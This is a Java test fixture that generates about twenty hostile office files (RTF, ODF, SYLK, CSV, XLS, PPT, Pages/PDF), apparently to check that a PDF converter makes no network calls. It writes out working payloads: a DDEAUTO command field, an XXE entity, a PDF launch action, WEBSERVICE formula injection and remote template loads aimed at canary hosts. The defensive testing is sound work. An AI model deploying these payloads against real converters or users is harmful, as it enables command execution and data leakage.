package stirling.software.officeconvert.topdf.testing;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.UncheckedIOException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Map;
import java.util.TreeMap;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

import org.apache.pdfbox.cos.COSName;
import org.apache.pdfbox.pdmodel.PDDocument;
import org.apache.pdfbox.pdmodel.PDPage;
import org.apache.pdfbox.pdmodel.PDPageContentStream;
import org.apache.pdfbox.pdmodel.common.PDRectangle;
import org.apache.pdfbox.pdmodel.font.PDType1Font;
import org.apache.pdfbox.pdmodel.font.Standard14Fonts;
import org.apache.pdfbox.pdmodel.interactive.action.PDActionLaunch;
import org.apache.pdfbox.pdmodel.interactive.action.PDActionURI;
import org.apache.pdfbox.pdmodel.interactive.annotation.PDAnnotationLink;
import org.apache.poi.hslf.usermodel.HSLFHyperlink;
import org.apache.poi.hslf.usermodel.HSLFSlide;
import org.apache.poi.hslf.usermodel.HSLFSlideShow;
import org.apache.poi.hslf.usermodel.HSLFTextBox;
import org.apache.poi.hssf.usermodel.HSSFWorkbook;
import org.apache.poi.ss.usermodel.Cell;
import org.apache.poi.ss.usermodel.Hyperlink;
import org.apache.poi.ss.usermodel.Row;
import org.apache.poi.ss.usermodel.Sheet;
import org.apache.poi.common.usermodel.HyperlinkType;

public final class HostileFormats {

    private static final String ODF_NS = "xmlns:office=\"urn:oasis:names:tc:opendocument:xmlns:office:1.0\""
            + " xmlns:style=\"urn:oasis:names:tc:opendocument:xmlns:style:1.0\""
            + " xmlns:text=\"urn:oasis:names:tc:opendocument:xmlns:text:1.0\""
            + " xmlns:table=\"urn:oasis:names:tc:opendocument:xmlns:table:1.0\""
            + " xmlns:draw=\"urn:oasis:names:tc:opendocument:xmlns:drawing:1.0\""
            + " xmlns:fo=\"urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0\""
            + " xmlns:svg=\"urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0\""
            + " xmlns:presentation=\"urn:oasis:names:tc:opendocument:xmlns:presentation:1.0\""
            + " xmlns:xlink=\"http://www.w3.org/1999/xlink\" xmlns:xi=\"http://www.w3.org/2001/XInclude\"";

    private static final String OOO1_NS = "xmlns:office=\"http://openoffice.org/2000/office\""
            + " xmlns:style=\"http://openoffice.org/2000/style\" xmlns:text=\"http://openoffice.org/2000/text\""
            + " xmlns:draw=\"http://openoffice.org/2000/drawing\" xmlns:svg=\"http://www.w3.org/2000/svg\""
            + " xmlns:fo=\"http://www.w3.org/1999/XSL/Format\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"";

    private HostileFormats() {}

    public static Map<String, byte[]> all(NoNetwork net) {
        Map<String, byte[]> docs = new TreeMap<>();
        docs.put("hostile.rtf", rtf(net));
        docs.put("hostile.odt", odf(net, "text", odtBody(net), false));
        docs.put("doctype.odt", odf(net, "text", odtBody(net), true));
        docs.put("hostile.ods", odf(net, "spreadsheet", odsBody(net), false));
        docs.put("hostile.odp", odf(net, "presentation", odpBody(net), false));
        docs.put("hostile.odg", odf(net, "graphics", "<office:drawing>" + odpPage(net) + "</office:drawing>", false));
        docs.put("hostile.fodt", utf8(flatOdt(net, false)));
        docs.put("doctype.fodt", utf8(flatOdt(net, true)));
        docs.put("hostile.sxw", sxw(net));
        docs.put("hostile.xml", utf8(wordMl(net)));
        docs.put("hostile-sheet.xml", utf8(spreadsheet2003(net)));
        docs.put("hostile-flat.xml", utf8(flatOpc(Fixtures.hostileDocx(net))));
        docs.put("hostile.pages", pages(net));
        docs.put("hostile.slk", ascii("ID;PWXL;N;E\r\nC;Y1;X1;K\"" + net.url("sylk") + "\"\r\nC;Y1;X2;K\"cached\";EWEBSERVICE(\""
                + net.url("sylk-formula") + "\")\r\nE\r\n"));
        docs.put("hostile.dif", ascii("TABLE\r\n0,1\r\n\"\"\r\nVECTORS\r\n0,1\r\n\"\"\r\nTUPLES\r\n0,1\r\n\"\"\r\nDATA\r\n0,0"
                + "\r\n\"\"\r\n-1,0\r\nBOT\r\n1,0\r\n\"" + net.url("dif") + "\"\r\n-1,0\r\nEOD\r\n"));
        docs.put("hostile.dbf", dbf(net.url("dbf")));
        docs.put("hostile.wk1", wk1(net.url("lotus")));
        docs.put("hostile.csv", utf8("=WEBSERVICE(\"" + net.url("csv") + "\"),=HYPERLINK(\"" + net.url("csv-link")
                + "\",\"go\")," + net.uncPath("csv") + "\r\nplain,text,row\r\n"));
        docs.put("hostile.txt", utf8("Plain text with " + String.join(" ", net.hostileTargets("txt")) + "\n"));
        docs.put("hostile.xls", xls(net));
        docs.put("hostile.ppt", ppt(net));
        return docs;
    }

    private static byte[] utf8(String s) {
        return s.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] ascii(String s) {
        return s.getBytes(StandardCharsets.ISO_8859_1);
    }

    private static String rtfPath(String s) {
        return s.replace("\\", "\\\\");
    }

    private static byte[] rtf(NoNetwork net) {
        String png = "89504e470d0a1a0a";
        return ascii("{\\rtf1\\ansi{\\fonttbl{\\f0 Arial;}}{\\*\\template " + net.url("normal.dotm") + "}"
                + "\\pard Body text {\\field{\\*\\fldinst INCLUDEPICTURE \"" + net.url("include.png")
                + "\" \\\\d}{\\fldrslt CACHED-PICTURE}} {\\field{\\*\\fldinst INCLUDETEXT \"" + rtfPath(net.uncPath("x.docx"))
                + "\"}{\\fldrslt CACHED-TEXT}} {\\field{\\*\\fldinst HYPERLINK \"" + net.url("link")
                + "\"}{\\fldrslt link}} {\\field{\\*\\fldinst DDEAUTO cmd \"/c calc\"}{\\fldrslt CACHED-DDE}}"
                + "{\\object\\objautlink\\rsltpict{\\*\\objclass Excel.Sheet.12}{\\*\\objdata 01050000}"
                + "{\\*\\objdata " + rtfPath(net.fileUrl("object.xlsx")) + "}{\\result CACHED-OBJECT}}"
                + "{\\pict\\pngblip\\picw10\\pich10{\\*\\picprop{\\sp{\\sn pibName}{\\sv " + net.url("linked.png")
                + "}}{\\sp{\\sn pibFlags}{\\sv 10}}}" + png + "}\\par}");
    }

    private static String odtBody(NoNetwork net) {
        return "<office:text><text:p>Hostile ODT <text:a xlink:href=\"" + net.url("link") + "\">link</text:a></text:p>"
                + "<text:p><draw:frame svg:width=\"2cm\" svg:height=\"2cm\"><draw:image xlink:href=\""
                + net.url("linked.png") + "\" xlink:type=\"simple\"/></draw:frame><draw:frame svg:width=\"2cm\""
                + " svg:height=\"2cm\"><draw:object xlink:href=\"" + net.uncPath("object.ods") + "\"/></draw:frame>"
                + "<draw:frame svg:width=\"2cm\" svg:height=\"2cm\"><draw:image xlink:href=\"" + net.fileUrl("f.png")
                + "\"/></draw:frame></text:p><text:section text:name=\"Linked\"><text:section-source xlink:href=\""
                + net.canaryUrl("section.odt") + "\"/><text:p>CACHED-SECTION</text:p></text:section>"
                + "<xi:include href=\"" + net.url("xinclude.xml") + "\" parse=\"xml\"/></office:text>";
    }

    private static String odsBody(NoNetwork net) {
        return "<office:spreadsheet><table:table table:name=\"Linked\"><table:table-source xlink:href=\""
                + net.url("sheet.ods") + "\" table:mode=\"copy-all\"/><table:table-row><table:table-cell"
                + " table:formula=\"of:=WEBSERVICE(&quot;" + net.url("webservice") + "&quot;)\" office:value-type=\"string\""
                + " office:string-value=\"CACHED\"><text:p>CACHED</text:p><table:cell-range-source table:name=\"r\""
                + " xlink:href=\"" + net.uncPath("range.ods") + "\" table:last-column-spanned=\"1\""
                + " table:last-row-spanned=\"1\"/></table:table-cell><table:table-cell><text:p><text:a xlink:href=\""
                + net.url("cell-link") + "\">go</text:a></text:p></table:table-cell></table:table-row></table:table>"
                + "</office:spreadsheet>";
    }

    private static String odpPage(NoNetwork net) {
        return "<draw:page draw:name=\"One\"><draw:frame svg:x=\"1cm\" svg:y=\"1cm\" svg:width=\"4cm\" svg:height=\"4cm\">"
                + "<draw:image xlink:href=\"" + net.url("slide.png") + "\"/></draw:frame><draw:frame svg:x=\"6cm\""
                + " svg:y=\"1cm\" svg:width=\"4cm\" svg:height=\"4cm\"><draw:plugin xlink:href=\"" + net.url("movie.mp4")
                + "\"/></draw:frame><draw:a xlink:href=\"" + net.url("shape-link") + "\"><draw:frame svg:x=\"1cm\""
                + " svg:y=\"6cm\" svg:width=\"4cm\" svg:height=\"1cm\"><draw:text-box><text:p>linked</text:p>"
                + "</draw:text-box></draw:frame></draw:a></draw:page>";
    }

    private static String odpBody(NoNetwork net) {
        return "<office:presentation>" + odpPage(net) + "</office:presentation>";
    }

    private static String styles(NoNetwork net) {
        return "<?xml version=\"1.0\" encoding=\"UTF-8\"?><office:document-styles " + ODF_NS + " office:version=\"1.3\">"
                + "<office:styles><style:style style:name=\"Standard\" style:family=\"paragraph\">"
                + "<style:paragraph-properties><style:background-image xlink:href=\"" + net.url("background.png")
                + "\"/></style:paragraph-properties></style:style></office:styles></office:document-styles>";
    }

    private static String doctype(NoNetwork net, String root) {
        return "<!DOCTYPE " + root + " SYSTEM \"" + net.url("evil.dtd") + "\" [<!ENTITY xxe SYSTEM \"" + net.url("xxe")
                + "\">]>";
    }

    private static byte[] odf(NoNetwork net, String kind, String body, boolean doctype) {
        String styles = styles(net);
        String content = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                + (doctype ? doctype(net, "office:document-content") : "")
                + "<office:document-content " + ODF_NS + " office:version=\"1.3\"><office:body>"
                + (doctype ? body.replace("Hostile ODT", "&xxe;") : body) + "</office:body></office:document-content>";
        return new ZipBytes().add("mimetype", "application/vnd.oasis.opendocument." + kind).add("content.xml", content)
                .add("styles.xml", styles).add("META-INF/manifest.xml", "<manifest:manifest xmlns:manifest=\"urn:oasis:"
                        + "names:tc:opendocument:xmlns:manifest:1.0\"><manifest:file-entry manifest:full-path=\"/\""
                        + " manifest:media-type=\"application/vnd.oasis.opendocument." + kind + "\"/></manifest:manifest>")
                .bytes();
    }

    private static String flatOdt(NoNetwork net, boolean doctype) {
        String body = odtBody(net);
        return "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" + (doctype ? doctype(net, "office:document") : "")
                + "<office:document " + ODF_NS + " office:version=\"1.3\" office:mimetype=\"application/vnd.oasis."
                + "opendocument.text\"><office:body>" + (doctype ? body.replace("Hostile ODT", "&xxe;") : body)
                + "</office:body></office:document>";
    }

    private static byte[] sxw(NoNetwork net) {
        String content = "<?xml version=\"1.0\"?><office:document-content " + OOO1_NS + " office:class=\"text\">"
                + "<office:body><text:p>Hostile SXW <text:a xlink:href=\"" + net.url("link") + "\">link</text:a></text:p>"
                + "<text:p><draw:image xlink:href=\"" + net.url("linked.png") + "\" svg:width=\"2cm\" svg:height=\"2cm\"/>"
                + "<draw:object xlink:href=\"" + net.uncPath("object.sxc") + "\"/></text:p></office:body>"
                + "</office:document-content>";
        return new ZipBytes().add("mimetype", "application/vnd.sun.xml.writer").add("content.xml", content).bytes();
    }

    private static String wordMl(NoNetwork net) {
        return "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><?mso-application progid=\"Word.Document\"?>"
                + "<?xml-stylesheet type=\"text/xsl\" href=\"" + net.url("style.xsl") + "\"?>"
                + "<w:wordDocument xmlns:w=\"http://schemas.microsoft.com/office/word/2003/wordml\""
                + " xmlns:v=\"urn:schemas-microsoft-com:vml\" xmlns:xi=\"http://www.w3.org/2001/XInclude\">"
                + "<w:docPr><w:attachedTemplate w:val=\"" + net.url("normal.dot") + "\"/></w:docPr><w:body>"
                + "<w:p><w:r><w:t>Hostile WordML</w:t></w:r></w:p><w:p><w:hlink w:dest=\"" + net.url("link")
                + "\"><w:r><w:t>link</w:t></w:r></w:hlink></w:p><w:p><w:fldSimple w:instr=\"INCLUDEPICTURE &quot;"
                + net.url("include.png") + "&quot;\"><w:r><w:t>CACHED</w:t></w:r></w:fldSimple></w:p><w:p><w:r><w:pict>"
                + "<v:shape style=\"width:10pt;height:10pt\"><v:imagedata src=\"" + net.url("linked.png") + "\"/>"
                + "</v:shape></w:pict></w:r></w:p><xi:include href=\"" + net.url("xinclude.xml") + "\"/></w:body>"
                + "</w:wordDocument>";
    }

    private static String spreadsheet2003(NoNetwork net) {
        return "<?xml version=\"1.0\"?><?mso-application progid=\"Excel.Sheet\"?><?xml-stylesheet type=\"text/xsl\" href=\""
                + net.url("style.xsl") + "\"?><Workbook xmlns=\"urn:schemas-microsoft-com:office:spreadsheet\""
                + " xmlns:ss=\"urn:schemas-microsoft-com:office:spreadsheet\" xmlns:x=\"urn:schemas-microsoft-com:office:excel\">"
                + "<Worksheet ss:Name=\"Hostile\"><Table><Row><Cell ss:HRef=\"" + net.url("link") + "\"><Data"
                + " ss:Type=\"String\">link</Data></Cell><Cell ss:Formula=\"=WEBSERVICE(&quot;" + net.url("webservice")
                + "&quot;)\"><Data ss:Type=\"String\">CACHED</Data></Cell></Row></Table><x:QueryTable><x:QuerySource>"
                + "<x:URLString>" + net.url("query") + "</x:URLString></x:QuerySource></x:QueryTable></Worksheet>"
                + "</Workbook>";
    }

    private static String flatOpc(byte[] zip) {
        StringBuilder b = new StringBuilder("<?xml version=\"1.0\" standalone=\"yes\"?><?mso-application"
                + " progid=\"Word.Document\"?><pkg:package xmlns:pkg=\"http://schemas.microsoft.com/office/2006/xmlPackage\">");
        try (ZipInputStream in = new ZipInputStream(new ByteArrayInputStream(zip))) {
            for (ZipEntry e; (e = in.getNextEntry()) != null;) {
                byte[] data = in.readAllBytes();
                String name = "/" + e.getName();
                if (name.equals("/[Content_Types].xml")) {
                    continue;
                }
                String type = name.endsWith(".rels") ? "application/vnd.openxmlformats-package.relationships+xml"
                        : name.equals("/word/document.xml")
                                ? "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"
                                : "application/xml";
                b.append("<pkg:part pkg:name=\"").append(name).append("\" pkg:contentType=\"").append(type).append("\">");
                if ((name.endsWith(".xml") || name.endsWith(".rels")) && !new String(data, StandardCharsets.UTF_8)
                        .contains("<!DOCTYPE")) {
                    String xml = new String(data, StandardCharsets.UTF_8).replaceFirst("^<\\?xml[^>]*\\?>", "");
                    b.append("<pkg:xmlData>").append(xml).append("</pkg:xmlData>");
                } else {
                    b.append("<pkg:binaryData>").append(Base64.getEncoder().encodeToString(data))
                            .append("</pkg:binaryData>");
                }
                b.append("</pkg:part>");
            }
        } catch (IOException e) {
            throw new UncheckedIOException(e);
        }
        return b.append("</pkg:package>").toString();
    }

    private static byte[] pages(NoNetwork net) {
        try (PDDocument d = new PDDocument(); ByteArrayOutputStream out = new ByteArrayOutputStream()) {
            PDPage p = new PDPage(PDRectangle.A4);
            d.addPage(p);
            try (PDPageContentStream c = new PDPageContentStream(d, p)) {
                c.beginText();
                c.setFont(new PDType1Font(Standard14Fonts.FontName.HELVETICA), 14);
                c.newLineAtOffset(72, 700);
                c.showText("Hostile preview");
                c.endText();
            }
            PDActionURI uri = new PDActionURI();
            uri.setURI(net.url("preview-link"));
            PDAnnotationLink link = new PDAnnotationLink();
            link.setRectangle(new PDRectangle(72, 690, 200, 30));
            link.setAction(uri);
            p.getAnnotations().add(link);
            PDActionLaunch launch = new PDActionLaunch();
            launch.getCOSObject().setString(COSName.F, net.uncPath("run.exe"));
            d.getDocumentCatalog().setOpenAction(launch);
            PDActionURI open = new PDActionURI();
            open.setURI(net.canaryUrl("open"));
            p.getCOSObject().setItem(COSName.AA, open.getCOSObject());
            d.save(out);
            return new ZipBytes().add("index.xml", "<sl:document/>").add("QuickLook/Preview.pdf", out.toByteArray())
                    .bytes();
        } catch (IOException e) {
            throw new UncheckedIOException(e);
        }
    }

    private static byte[] dbf(String text) {
        byte[] value = text.getBytes(StandardCharsets.ISO_8859_1);
        int header = 32 + 32 + 1;
        int record = 1 + value.length;
        ByteBuffer b = ByteBuffer.allocate(header + record + 1).order(ByteOrder.LITTLE_ENDIAN);
        b.put((byte) 0x03).put((byte) 124).put((byte) 1).put((byte) 1).putInt(1).putShort((short) header)
                .putShort((short) record);
        b.position(32);
        b.put("URL".getBytes(StandardCharsets.US_ASCII)).position(32 + 11);
        b.put((byte) 'C').position(32 + 16);
        b.put((byte) value.length).position(64);
        b.put((byte) 0x0D).put((byte) ' ').put(value).put((byte) 0x1A);
        return b.array();
    }

    private static byte[] wk1(String text) {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        record(out, 0x00, new byte[] {0x06, 0x04});
        byte[] t = text.getBytes(StandardCharsets.ISO_8859_1);
        ByteBuffer label = ByteBuffer.allocate(5 + 1 + t.length + 1).order(ByteOrder.LITTLE_ENDIAN);
        label.put((byte) 0xFF).putShort((short) 0).putShort((short) 0).put((byte) '\'').put(t).put((byte) 0);
        record(out, 0x0F, label.array());
        record(out, 0x01, new byte[0]);
        return out.toByteArray();
    }

    private static void record(ByteArrayOutputStream out, int type, byte[] data) {
        out.write(type);
        out.write(type >> 8);
        out.write(data.length);
        out.write(data.length >> 8);
        out.writeBytes(data);
    }

    private static byte[] xls(NoNetwork net) {
        try (HSSFWorkbook wb = new HSSFWorkbook(); ByteArrayOutputStream out = new ByteArrayOutputStream()) {
            Sheet s = wb.createSheet("Hostile");
            Row r = s.createRow(0);
            Cell a = r.createCell(0);
            a.setCellValue("link");
            Hyperlink h = wb.getCreationHelper().createHyperlink(HyperlinkType.URL);
            h.setAddress(net.url("xls-link"));
            a.setHyperlink(h);
            Cell f = r.createCell(1);
            f.setCellFormula("HYPERLINK(\"" + net.url("xls-formula") + "\",\"go\")");
            wb.write(out);
            return out.toByteArray();
        } catch (IOException e) {
            throw new UncheckedIOException(e);
        }
    }

    private static byte[] ppt(NoNetwork net) {
        try (HSLFSlideShow show = new HSLFSlideShow(); ByteArrayOutputStream out = new ByteArrayOutputStream()) {
            HSLFSlide slide = show.createSlide();
            HSLFTextBox box = slide.createTextBox();
            box.setText("Hostile slide");
            box.setAnchor(new java.awt.Rectangle(50, 50, 300, 50));
            HSLFHyperlink link = box.getTextParagraphs().get(0).getTextRuns().get(0).createHyperlink();
            link.linkToUrl(net.url("ppt-link"));
            show.write(out);
            return out.toByteArray();
        } catch (IOException e) {
            throw new UncheckedIOException(e);
        }
    }
}
